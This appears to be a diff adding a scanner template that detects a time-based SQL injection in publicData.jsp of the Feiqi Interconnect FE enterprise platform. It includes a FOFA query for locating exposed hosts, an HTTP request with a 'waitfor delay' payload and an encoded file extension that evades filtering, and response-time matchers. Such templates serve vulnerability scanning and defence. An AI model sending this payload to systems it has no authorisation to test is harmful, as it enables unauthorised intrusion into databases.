@@ -1,0 +1,24 @@
+## id: VEID-2024-0210
+## name: 飞企互联-FE企业运营管理平台publicData.jsp存在SQL注入漏洞
+## author: hack007x
+## severity: high
+## tags: veid,sql,veid2024
+## description:FE企业运营管理平台前台存在sql注入
+## fofa-query: app="FE-协作平台" , app="飞企互联-FE企业运营管理平台"
+## verification: true
+
+
+GET /oaerp/ui/common/publicData.js%70?type=getAllTableInfo&db=';waitfor+delay+'0:0:7'-- HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+#@ timeout: 20
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: response_time > 7
+
+
+
+
+
+# @VEIL-STAMP: a283552959a6adf2a9475664c4d5e2b861827d8944273262dde923786c8f7a39
